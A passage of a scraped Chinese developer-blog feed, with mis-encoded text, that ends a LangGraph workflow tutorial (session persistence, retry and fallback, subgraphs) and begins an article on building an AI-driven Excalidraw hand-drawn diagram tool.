<span class="hljs-comment"># è¿è¡Œæ—¶æŒ‡å®šä¼šè¯ IDï¼Œå®ç°çŠ¶æ€éš”ç¦»å’Œç»­è·‘</span>
config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"user_123"</span>}}  <span class="hljs-comment"># ä¼šè¯ID</span>

<span class="hljs-comment"># ç¬¬ä¸€æ¬¡è°ƒç”¨</span>
graph.invoke({<span class="hljs-string">"query"</span>: <span class="hljs-string">"å…ˆæŸ¥å¤©æ°”"</span>}, config=config)

<span class="hljs-comment"># ç¬¬äºŒæ¬¡è°ƒç”¨ï¼šå¤ç”¨ä¹‹å‰çš„çŠ¶æ€</span>
result = graph.invoke({<span class="hljs-string">"query"</span>: <span class="hljs-string">"å†æŸ¥æ±‡ç‡"</span>}, config=config)
<span class="hljs-built_in">print</span>(result[<span class="hljs-string">"final_answer"</span>])
</code></pre>
<h4 data-id="heading-5">5. å›é€€ / é‡è¯•ç­–ç•¥ï¼ˆFallback/Retryï¼‰</h4>
<p>å½“æŸä¸ªèŠ‚ç‚¹æ‰§è¡Œå¤±è´¥ï¼ˆå¦‚å·¥å…·è°ƒç”¨è¶…æ—¶ã€LLM æŠ¥é”™ï¼‰æ—¶ï¼Œè‡ªåŠ¨å›é€€åˆ°å¤‡é€‰èŠ‚ç‚¹æˆ–é‡è¯•å½“å‰èŠ‚ç‚¹ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šå·¥å…·è°ƒç”¨å®¹é”™ã€LLM æœåŠ¡ä¸ç¨³å®šæ—¶çš„é™çº§å¤„ç†ã€ç”¨æˆ·è¾“å…¥æ ¼å¼é”™è¯¯æ—¶çš„é‡è¯•ã€‚</li>
</ul>
<p>å…³é”®é€»è¾‘ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.errors <span class="hljs-keyword">import</span> NodeError

<span class="hljs-comment"># å¸¦é‡è¯•çš„å·¥å…·è°ƒç”¨èŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">call_tool_with_retry</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># æ¨¡æ‹Ÿå·¥å…·è°ƒç”¨å¤±è´¥</span>
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"å·¥å…·è°ƒç”¨è¶…æ—¶"</span>)
        state[<span class="hljs-string">"tool_result"</span>] = <span class="hljs-string">"è®¡ç®—ç»“æœï¼š100"</span>
        <span class="hljs-keyword">return</span> state
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># è®°å½•é”™è¯¯ï¼Œè§¦å‘é‡è¯•</span>
        state[<span class="hljs-string">"error"</span>] = <span class="hljs-built_in">str</span>(e)
        <span class="hljs-keyword">raise</span> NodeError(<span class="hljs-string">f"å·¥å…·è°ƒç”¨å¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>) <span class="hljs-keyword">from</span> e

<span class="hljs-comment"># å®šä¹‰å›é€€é€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_tool_error</span>(<span class="hljs-params">state: AgentState</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># é‡è¯•æ¬¡æ•°å°äº 3 åˆ™é‡è¯•ï¼Œå¦åˆ™é™çº§</span>
    state[<span class="hljs-string">"retry_count"</span>] = state.get(<span class="hljs-string">"retry_count"</span>, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> state[<span class="hljs-string">"retry_count"</span>] &lt; <span class="hljs-number">3</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"call_tool"</span>
    <span class="hljs-keyword">else</span>:
        state[<span class="hljs-string">"final_answer"</span>] = <span class="hljs-string">"å·¥å…·è°ƒç”¨å¤±è´¥ï¼Œæ— æ³•å›ç­”"</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"end"</span>

<span class="hljs-comment"># é…ç½®é”™è¯¯å¤„ç†</span>
graph_builder.add_conditional_edges(
    <span class="hljs-string">"call_tool"</span>,
    handle_tool_error,
    {
        <span class="hljs-string">"call_tool"</span>: <span class="hljs-string">"call_tool"</span>,  <span class="hljs-comment"># é‡è¯•</span>
        <span class="hljs-string">"end"</span>: END,  <span class="hljs-comment"># é™çº§ç»“æŸ</span>
    },
)

<span class="hljs-comment"># æ•è·èŠ‚ç‚¹é”™è¯¯</span>
graph = graph_builder.<span class="hljs-built_in">compile</span>(catch_exceptions=<span class="hljs-literal">True</span>)
</code></pre>
<h4 data-id="heading-6">6. å­å›¾åµŒå¥—ç­–ç•¥ï¼ˆSubgraph Nestingï¼‰</h4>
<p>å°†ä¸€ç»„ç›¸å…³èŠ‚ç‚¹å°è£…ä¸ºä¸€ä¸ªç‹¬ç«‹çš„å­å›¾ï¼Œå†å°†å­å›¾ä½œä¸º â€œèŠ‚ç‚¹â€ åµŒå…¥ä¸»å·¥ä½œæµï¼Œå®ç°å·¥ä½œæµçš„æ¨¡å—åŒ–ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šå¤æ‚å·¥ä½œæµçš„æ¨¡å—åŒ–æ‹†åˆ†ï¼ˆå¦‚ â€œæ•°æ®åˆ†æå­å›¾â€â€œæŠ¥å‘Šç”Ÿæˆå­å›¾â€ï¼‰ã€å¤ç”¨é€šç”¨å·¥ä½œæµç‰‡æ®µã€‚</li>
</ul>
<p>æ ¸å¿ƒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰å­å›¾</span>
subgraph_builder = StateGraph(AgentState)
subgraph_builder.add_node(<span class="hljs-string">"step1"</span>, step1_func)
subgraph_builder.add_node(<span class="hljs-string">"step2"</span>, step2_func)
subgraph_builder.set_entry_point(<span class="hljs-string">"step1"</span>)
subgraph_builder.add_edge(<span class="hljs-string">"step1"</span>, <span class="hljs-string">"step2"</span>)
subgraph_builder.add_edge(<span class="hljs-string">"step2"</span>, END)
subgraph = subgraph_builder.<span class="hljs-built_in">compile</span>()

<span class="hljs-comment"># ä¸»å›¾ä¸­æ·»åŠ å­å›¾ä½œä¸ºèŠ‚ç‚¹</span>
graph_builder.add_node(<span class="hljs-string">"subgraph_node"</span>, subgraph)
graph_builder.add_edge(<span class="hljs-string">"check_need_tool"</span>, <span class="hljs-string">"subgraph_node"</span>)
graph_builder.add_edge(<span class="hljs-string">"subgraph_node"</span>, END)
</code></pre>
<h3 data-id="heading-7">äºŒã€è¿›é˜¶ç­–ç•¥ï¼ˆè¡¥å……ï¼‰</h3>
<ol>
<li>ä¼˜å…ˆçº§ç­–ç•¥ï¼šåœ¨å¹¶è¡ŒèŠ‚ç‚¹ä¸­è®¾ç½®æ‰§è¡Œä¼˜å…ˆçº§ï¼Œæˆ–åœ¨åˆ†æ”¯é€»è¾‘ä¸­ä¼˜å…ˆé€‰æ‹©æ›´ä¼˜è·¯å¾„ï¼ˆå¦‚ä¼˜å…ˆä½¿ç”¨ç¼“å­˜ç»“æœè€Œéè°ƒç”¨å·¥å…·ï¼‰ã€‚</li>
<li>ä¸­æ–­ / æ‰‹åŠ¨å¹²é¢„ç­–ç•¥ï¼šé€šè¿‡ <code>interrupt_before</code> / <code>interrupt_after</code> é…ç½®ï¼Œè®©å·¥ä½œæµåœ¨æŒ‡å®šèŠ‚ç‚¹æš‚åœï¼Œç­‰å¾…äººå·¥è¾“å…¥åå†ç»§ç»­ï¼ˆé€‚ç”¨äºéœ€è¦äººå·¥å®¡æ ¸çš„åœºæ™¯ï¼‰ã€‚</li>
<li>ç¼“å­˜ç­–ç•¥ï¼šå¯¹é‡å¤çš„èŠ‚ç‚¹æ‰§è¡Œç»“æœï¼ˆå¦‚ç›¸åŒçš„å·¥å…·è°ƒç”¨ï¼‰è¿›è¡Œç¼“å­˜ï¼Œé¿å…é‡å¤è®¡ç®—ï¼Œæå‡æ•ˆç‡ã€‚</li>
</ol>
<h3 data-id="heading-8">æ€»ç»“</h3>
<p>LangGraph å·¥ä½œæµçš„æ ¸å¿ƒç­–ç•¥å¯å½’çº³ä¸ºä»¥ä¸‹å…³é”®ç‚¹ï¼š</p>
<ol>
<li>æ¡ä»¶åˆ†æ”¯æ˜¯åŸºç¡€ï¼Œå®ç° â€œå†³ç­–å¼â€ æµç¨‹ï¼›å¾ªç¯ç­–ç•¥æ˜¯æ ¸å¿ƒï¼Œæ”¯æ’‘æ™ºèƒ½ä½“çš„è¿­ä»£æ€è€ƒã€‚</li>
<li>å¹¶è¡Œæ‰§è¡Œæå‡æ•ˆç‡ï¼ŒçŠ¶æ€æŒä¹…åŒ–å®ç°ä¼šè¯è®°å¿†å’Œæ–­ç‚¹ç»­è·‘ã€‚</li>
<li>å›é€€ / é‡è¯•ä¿éšœé²æ£’æ€§ï¼Œå­å›¾åµŒå¥—å®ç°å¤æ‚æµç¨‹çš„æ¨¡å—åŒ–ç®¡ç†ã€‚</li>
</ol>
<p>è¿™äº›ç­–ç•¥å¯ä»¥ç»„åˆä½¿ç”¨ï¼ˆå¦‚ â€œå¾ªç¯ + æ¡ä»¶åˆ†æ”¯ + å¹¶è¡Œâ€ï¼‰ï¼Œæ»¡è¶³ä»ç®€å•é—®ç­”åˆ°å¤æ‚æ™ºèƒ½ä½“çš„å‡ ä¹æ‰€æœ‰å·¥ä½œæµè®¾è®¡éœ€æ±‚ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI+Excalidrawï¼Œç”¨è‡ªç„¶è¯­è¨€ç”»æ‰‹ç»˜é£æ ¼æŠ€æœ¯å›¾]]></title>    <link>https://juejin.cn/post/7588711557500010546</link>    <guid>https://juejin.cn/post/7588711557500010546</guid>    <pubDate>2025-12-29T04:46:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588711557500010546" data-draft-id="7588733783571595302" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI+Excalidrawï¼Œç”¨è‡ªç„¶è¯­è¨€ç”»æ‰‹ç»˜é£æ ¼æŠ€æœ¯å›¾"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T04:46:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="coæ¾æŸ"/> <meta itemprop="url" content="https://juejin.cn/user/3347391744589655"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI+Excalidrawï¼Œç”¨è‡ªç„¶è¯­è¨€ç”»æ‰‹ç»˜é£æ ¼æŠ€æœ¯å›¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3347391744589655/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    coæ¾æŸ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:46:45.000Z" title="Mon Dec 29 2025 04:46:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">âœ¨å‰è¨€</h2>
<p>Hiï¼Œæˆ‘æ˜¯æ¾æŸï¼</p>
<p>ä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰ç”¨è¿‡ Excalidraw ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fexcalidraw%2Fexcalidraw" target="_blank" title="https://github.com/excalidraw/excalidraw" ref="nofollow noopener noreferrer">Excalidraw</a> æ˜¯ä¸€æ¬¾å¼€æºçš„æ‰‹ç»˜é£æ ¼è™šæ‹Ÿç™½æ¿ï¼Œåœ¨ Github ä¸Šæœ‰ 113k çš„ starï¼Œç”»å‡ºæ¥çš„æµç¨‹å›¾ã€æ—¶åºå›¾ã€æ¶æ„å›¾ç­‰ç­‰è¿˜æ˜¯æŒºæœ‰ç‰¹è‰²çš„ï¼Œå¤§æ¦‚æ˜¯è¿™ç§é£æ ¼ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90c6ca7b104240188ce0bc25861a8743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=O3%2F6AzYm1V7%2FXtOwN6oaJhKyNjc%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘æˆ‘å¶ç„¶äº†è§£åˆ° Excalidraw çš„åŸç†æ˜¯é€šè¿‡ JSON ç»˜å›¾ï¼Œé‚£å²‚ä¸æ„å‘³ç€å¯ä»¥é€šè¿‡ AI ç”Ÿæˆç¬¦åˆè§„èŒƒçš„ JSON å†…å®¹æ¥å®ç°è‡ªåŠ¨ç»˜å›¾ï¼æ‰€ä»¥ï¼Œæˆ‘å°±åšäº†ä¸ªå·¥å…·ï¼Œå®ç°é€šè¿‡ AI è‡ªåŠ¨ç»˜åˆ¶æ‰‹ç»˜é£æ ¼å›¾ï¼Œå®æ—¶æµå¼æ¸²æŸ“ï¼Œè¾¹ç”Ÿæˆè¾¹ç”»å›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1805471ed23d4ce79b9adb65df080e9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=GLzhvS4%2FSlvNjjSrWmNjmwtq3lo%3D" alt="" loading="lazy"/></p>
<p>è¿™è¿˜æœ‰ä¸ª gif ç‰ˆçš„ï¼Œè™½ç„¶æœ‰ç‚¹ç³Šï¼Œä¸è¿‡èƒ½çœ‹å‡ºæ˜¯æµå¼æ¸²æŸ“çš„ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7f5765f9a2947c2a39a243250f3ff95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=IKe%2F9rFVvzAovrQaS2G%2BABVtF8c%3D" alt="" loading="lazy"/></p>
<p>ç§»åŠ¨ç«¯çš„æ•ˆæœï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8be88eadf2a5424abc1e7bff84e7d279~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=WSGFn7g9IoSIdt88sCONpJm2%2BfY%3D" alt="" loading="lazy"/></p>
<p>ä½“éªŒåœ°å€ä¼šæ”¾åˆ°æ–‡ç« åº•éƒ¨ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œ<strong>ç‚¹èµå…³æ³¨</strong>ï¼Œæˆ‘ä»¬ç›´æ¥å‘è½¦ï¼</p>
<h2 data-id="heading-1">AI å®ç°</h2>
<p>è¿™é‡Œç»™å¤§å®¶åˆ†äº«ä¸¤ç§å®ç°æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡ AI å®ç°ï¼Œæˆ‘ä»¬åªè´Ÿè´£è¯´æ¸…æ¥šéœ€æ±‚ï¼Œç„¶åä½œä¸ºä¸€ä¸ªç›‘å·¥è®© AI å¹²æ´»ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ç°åœ¨åšæ–°åŠŸèƒ½æœ€å–œæ¬¢çš„æ–¹å¼ï¼›å¦ä¸€ç§å°±æ˜¯ä¸€æ­¥ä¸€æ­¥çš„æ‰‹åŠ¨ç¼–ç å®ç°å•¦ã€‚</p>
<p>ä¸è¿‡ç¬¬ä¸€ç§æ–¹å¼åªé€‚åˆæˆ‘ä»¬å·²ç»æ¸…æ¥šäº†è¿™ä¸ªåº”è¯¥æ€ä¹ˆåšï¼Œæœ‰æ€è·¯ä½†æ˜¯ä¸æƒ³åšä¸€äº›é‡å¤çš„åŠ³åŠ¨ï¼Œå¦‚æœæ˜¯ä¸ºäº†å­¦ä¹ çš„è¯ï¼Œè¿˜æ˜¯æ›´å»ºè®®è‡ªå·±å®ç°ä¸€éã€‚</p>
<p>å…ˆæ¥çœ‹æ€ä¹ˆè®© AI æ¥åšè¿™ä¸ªéœ€æ±‚å§ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠéœ€æ±‚æ•´ç†æˆä¸€ä¸ªè¯¦ç»†çš„ promptï¼Œç›´æ¥å¤åˆ¶ç»™ AI å³å¯ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">å¸®æˆ‘å®ç°ä¸€ä¸ª AI + Excalidraw æ‰‹ç»˜é£æ ¼ç»˜å›¾å·¥å…·ï¼Œå…·ä½“è¦æ±‚å¦‚ä¸‹ï¼š

## ä¸€ã€åŠŸèƒ½éœ€æ±‚
1. é›†æˆ Excalidraw ç”»æ¿ï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.excalidraw.com/docs/@excalidraw/excalidraw/integration
2. é€šè¿‡ AI å¯¹è¯ç”Ÿæˆ Excalidraw JSON æ ¼å¼çš„å›¾å½¢å…ƒç´ 
3. æµå¼è¾“å‡º + å®æ—¶æ¸²æŸ“ï¼šæ¯è§£æåˆ°ä¸€ä¸ªå®Œæ•´çš„ JSON å…ƒç´ å°±ç«‹å³æ¸²æŸ“åˆ°ç”»å¸ƒ
4. æ”¯æŒç§»åŠ¨ç«¯å’Œæ¡Œé¢ç«¯å¸ƒå±€

## äºŒã€åç«¯è¦æ±‚
1. AI è°ƒç”¨åœ¨æœåŠ¡ç«¯è¿›è¡Œï¼Œä¸æš´éœ² API å¯†é’¥
2. è®°å½•æ¯æ¬¡å¯¹è¯çš„ IPã€User-Agentã€å¯¹è¯å†…å®¹ã€å“åº”æ—¶é—´ç­‰ä¿¡æ¯
3. æ”¯æŒçµæ´»åˆ‡æ¢å„å®¶ AI æœåŠ¡ï¼ˆOpenAIã€æ™ºè°±ã€é˜¿é‡Œç™¾ç‚¼ç­‰ï¼‰ï¼Œå°è£…ç»Ÿä¸€çš„å…¼å®¹å±‚

## ä¸‰ã€å‰ç«¯è¦æ±‚
1. å¯¹è¯å†å²ä¿å­˜åœ¨ localStorageï¼Œä¸ä¾èµ–åç«¯åŠ è½½
2. ç”»å¸ƒæ•°æ®ä¹Ÿä¿å­˜åœ¨ localStorageï¼Œåˆ·æ–°ä¸ä¸¢å¤±
3. æµå¼è§£æ AI è¿”å›çš„ JSON å…ƒç´ ï¼Œå¤„ç†åµŒå¥—å’Œå­—ç¬¦ä¸²å†…çš„èŠ±æ‹¬å·
4. ä¸º AI ç”Ÿæˆçš„å…ƒç´ è¡¥å…¨ Excalidraw å¿…éœ€çš„é»˜è®¤å­—æ®µ

## å››ã€ä»£ç è´¨é‡
1. ç»„ä»¶å°è£…ï¼šAI æœåŠ¡å±‚ã€æµå¼è§£æå™¨ã€ç”»å¸ƒç»„ä»¶ã€å¯¹è¯ç»„ä»¶åˆ†ç¦»
2. ç±»å‹å®‰å…¨ï¼šä½¿ç”¨ TypeScriptï¼Œå®šä¹‰å®Œæ•´çš„ç±»å‹
3. å¯å¤ç”¨ï¼šAI æœåŠ¡å°è£…æˆå¯é…ç½®çš„æ¨¡å—

## äº”ã€AI ç»˜å›¾æç¤ºè¯è¦ç‚¹
éœ€è¦è®¾è®¡ä¸€ä¸ª System Promptï¼ŒåŒ…å«ï¼š
- è¾“å‡ºæ ¼å¼ï¼šçº¯ JSONï¼Œç¦æ­¢ä»£ç å—ï¼Œæ–¹ä¾¿æµå¼è§£æ
- æ–‡å­—å¤„ç†ï¼šä¸­è‹±æ–‡å®½åº¦è®¡ç®—ã€å½¢çŠ¶å†…æ–‡å­—åŒå‘ç»‘å®š
- ç®­å¤´è§„èŒƒï¼špoints ç›¸å¯¹åæ ‡å†™æ³•
- å¸¸ç”¨é¢œè‰²ï¼šExcalidraw å†…ç½®è°ƒè‰²æ¿
</code></pre>
<p>æœ€å¥½æ˜¯ç”¨ä¸€äº› AI IDE çš„ Plan æ¨¡å¼ï¼Œåƒ Cursor ã€Trae è¿™äº›ï¼Œå…ˆè§„åˆ’ï¼Œå†æ‰§è¡Œã€‚</p>
<p>å½“ç„¶äº†ï¼ŒAI ç”Ÿæˆçš„ä»£ç å¯èƒ½éœ€è¦æ ¹æ®å®é™…æƒ…å†µå†è¿›è¡Œè°ƒæ•´ï¼Œä½†æ ¸å¿ƒé€»è¾‘ä¸€èˆ¬éƒ½æ˜¯æ²¡é—®é¢˜çš„ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯å¿«ï¼Œéå¸¸å¿«ï¼ŒåŸæœ¬ä¸‰ä¸ªå°æ—¶çš„æ´»ä¸‰åˆ†é’Ÿ AI å°±æå®Œäº†ï¼›ç¼ºç‚¹å°±æ˜¯æˆ‘ä»¬å¯¹å…·ä½“çš„å®ç°ç»†èŠ‚å¯èƒ½ä¸é‚£ä¹ˆäº†è§£ã€‚</p>
<h2 data-id="heading-2">æ‰‹åŠ¨å®ç°</h2>
<p>å¦‚æœæ˜¯ä»¥å­¦ä¹ æ€è·¯ä¸ºç›®çš„ï¼Œæ›´æ¨èç”¨è¿™ç§æ–¹å¼å®ç°ã€‚</p>
<h3 data-id="heading-3">æ•´ä½“æ¶æ„</h3>
<p>æ•´ä¸ªå·¥å…·çš„æ¶æ„åˆ†ä¸ºä¸‰å±‚ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">[ç”¨æˆ·è¾“å…¥æè¿°]
      â†“
[AI æµå¼ç”Ÿæˆ Excalidraw JSON]
      â†“
[æµå¼è§£æ JSON å…ƒç´ ]
      â†“
[å®æ—¶æ¸²æŸ“åˆ° Excalidraw ç”»å¸ƒ]
</code></pre>
<p>æ ¸å¿ƒæ€è·¯æ˜¯ï¼šç”¨æˆ·æè¿°æƒ³ç”»çš„å›¾ â†’ AI ç”Ÿæˆç¬¦åˆ Excalidraw è§„èŒƒçš„ JSON å…ƒç´  â†’ å‰ç«¯å®æ—¶è§£æå¹¶æ¸²æŸ“ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88fd24687c044d5ab0f0d10c14a5cc61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=Cuc2aVNPxIvtv97wZn1uISkchPU%3D" alt="" loading="lazy"/></p>
<p>æˆ‘è¿™é‡Œå‰ç«¯ä½¿ç”¨çš„æ˜¯ Next.js ï¼Œé›†æˆäº†å®˜æ–¹çš„ <code>@excalidraw/excalidraw</code> åŒ…ã€‚<br/>
åç«¯ä½¿ç”¨ Vercel AI SDK å¯¹æ¥å¤§æ¨¡å‹ï¼Œå®ƒæ”¯æŒ OpenAI åŠå…¼å®¹æœåŠ¡åƒæ™ºè°±ã€é˜¿é‡Œç™¾ç‚¼ç­‰ç­‰ã€‚</p>
<h3 data-id="heading-4">æ ¸å¿ƒå®ç°</h3>
<h4 data-id="heading-5">ä¸€ã€Excalidraw JSON è§„èŒƒ</h4>
